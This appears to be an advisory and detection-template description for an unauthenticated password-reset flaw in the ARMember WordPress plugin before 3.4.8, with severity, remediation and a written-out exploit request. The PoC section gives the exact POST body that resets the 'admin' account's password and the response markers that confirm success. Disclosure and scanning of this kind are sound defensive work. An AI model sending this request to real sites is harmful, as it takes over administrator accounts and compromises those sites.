## Vulnerability
ARMember WordPress plugin before 3.4.8 is vulnerable to unauthenticated account takeover (including administrator) due to missing nonce and authorization checks in the `arm_shortcode_form_ajax_action` AJAX handler. This permits any remote attacker who knows a target username to reset its password arbitrarily.

CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (8.1) • CWE-862 (Missing Authorization).  
Impact: full admin access and site compromise.  
Remediation: update to 3.4.8 or later.

## PoC / Detection
Classification: state-change

The template sends a single unauthenticated POST to `/wp-admin/admin-ajax.php` containing `action=arm_shortcode_form_ajax_action&user_pass={{randstr}}&repeat_pass={{randstr}}&arm_action=change-password&key2=x&action2=rp&login2=admin`. It detects successful exploitation when the response body simultaneously contains `"Your Password has been reset"` and `"arm_success_msg"`, the `Content-Type` header contains `text/html`, and status is 200.
